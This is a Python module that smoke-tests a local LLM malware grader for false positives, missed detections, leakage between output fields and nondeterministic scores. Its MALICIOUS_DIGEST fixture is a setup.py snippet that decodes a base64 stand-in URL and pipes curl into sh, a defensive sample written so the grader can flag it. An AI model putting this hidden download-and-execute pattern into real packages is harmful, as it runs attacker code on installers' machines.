"""Prove the model can hold the output contract before trusting a single score.

The seed checks that the configured model is installed. Installed is not the
same as capable. Measured on the seed's own code with a deliberately clean
digest (docs/PHASE1-EVIDENCE.md D-3):

    qwen2.5-coder:1.5b   9 of 14 called it malicious, and the reason field said
                         the code was "simple, well-structured"
    qwen2.5-coder:7b     0 of 14
    qwen2.5-coder:32b    0 of 14

Choosing a small model on a small machine is a reasonable thing to do. The seed
lets that user grade two thirds of clean repositories as malware and says
nothing. This module is the thing that says something.

A failure here does not stop the pipeline. It switches grading off and leaves
the deterministic screen running, because a screen with no scores is degraded
and a score nobody verified is wrong (ADR-0002 invariant 1).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Sequence

from .types import GradeClient, GradeResult

# A file that is obviously fine. Anything flagged here is a false positive by
# construction — there is nothing to find.
CLEAN_DIGEST = """
quicklog/core.py:
import json, sys, time
def log(level, msg, **fields):
    rec = {"t": time.time(), "level": level, "msg": msg, **fields}
    sys.stdout.write(json.dumps(rec) + "\\n")
"""

# A file that is obviously not. A model that misses this cannot be trusted with
# the cases that are actually hard.
MALICIOUS_DIGEST = """
setup.py:
import os, base64, urllib.request
_P = "aHR0cDovL2V2aWwuZXhhbXBsZS9zdGVhbA=="
os.system("curl -fsSL " + base64.b64decode(_P).decode() + " | sh")
"""

DETERMINISM_RUNS = 3

# The clean check is sampled, not asked once.
#
# The failure this exists to catch is probabilistic: measured on a clean digest,
# qwen2.5-coder:1.5b under the seed's prompt flagged 9 times in 12. A single
# sample would clear that model on roughly one attempt in four, and a gate that
# passes a broken model a quarter of the time is decoration. Five samples leave
# under a percent (0.25 ** 5).
CLEAN_SAMPLES = 5


@dataclass(frozen=True)
class SmokeResult:
    """Whether the model may be trusted, and if not, what it did wrong.

    `failures` is prose for a human, because the person who has to act on this
    is choosing a different model, not parsing a code.
    """

    passed: bool
    model: str
    failures: list[str] = field(default_factory=list)


def _check_clean(client: GradeClient) -> str | None:
    hits = sum(1 for _ in range(CLEAN_SAMPLES) if client.flags_malicious(CLEAN_DIGEST))
    if hits:
        return (
            f"called an obviously clean file malicious in {hits} of {CLEAN_SAMPLES} samples — "
            "every flag from this model is suspect"
        )
    return None


def _check_description_never_warns(results: Sequence[GradeResult]) -> str | None:
    """Checked across every sample, for the same reason the clean check is.

    Under the seed's prompt a 1.5b model wrote the warning prefix in 11 of 12
    runs, but a 7b model did it roughly one run in ten — often enough to matter
    and rare enough that one look would miss it.
    """
    for result in results:
        failure = _check_field_boundary(result)
        if failure is not None:
            return failure
    return None


def _check_malicious(client: GradeClient) -> str | None:
    if not client.flags_malicious(MALICIOUS_DIGEST):
        return "missed a base64-encoded download piped to a shell — it cannot be trusted with subtler cases"
    return None


def _check_field_boundary(result: GradeResult) -> str | None:
    """The description must be a description.

    Measured at 7b as well as 1.5b: the model sometimes begins `description`
    with a security warning even when it has not flagged anything, so the field
    boundary is checked at every size rather than assumed above one.
    """
    if result.description.lstrip().startswith(("⚠", "WARNING", "SECURITY")):
        return "wrote a security warning into the description field — the fields are not separated"
    return None


def _check_determinism(results: Sequence[GradeResult]) -> str | None:
    ideas = {r.idea for r in results}
    skills = {r.skill for r in results}
    if len(ideas) > 1 or len(skills) > 1:
        return (
            f"gave different scores for identical input across {len(results)} runs "
            f"(idea {sorted(ideas)}, skill {sorted(skills)}) — rankings would not be reproducible"
        )
    return None


def run_smoke(client: GradeClient) -> SmokeResult:
    """Every check, then one verdict. No early return: a model that fails two
    ways should say so once, not make the user fix one and rediscover the other."""
    failures: list[str] = []
    model = "unknown"

    try:
        repeats = [client.evaluate(CLEAN_DIGEST) for _ in range(max(DETERMINISM_RUNS, CLEAN_SAMPLES))]
        model = repeats[0].model
        for check in (
            _check_clean(client),
            _check_malicious(client),
            _check_description_never_warns(repeats),
            _check_determinism(repeats),
        ):
            if check is not None:
                failures.append(check)
    except Exception as exc:  # noqa: BLE001 — every client call belongs to the smoke result
        failure = "could not produce a grade at all" if model == "unknown" else "could not complete smoke checks"
        return SmokeResult(False, model, [f"{failure}: {exc}"])

    return SmokeResult(not failures, model, failures)
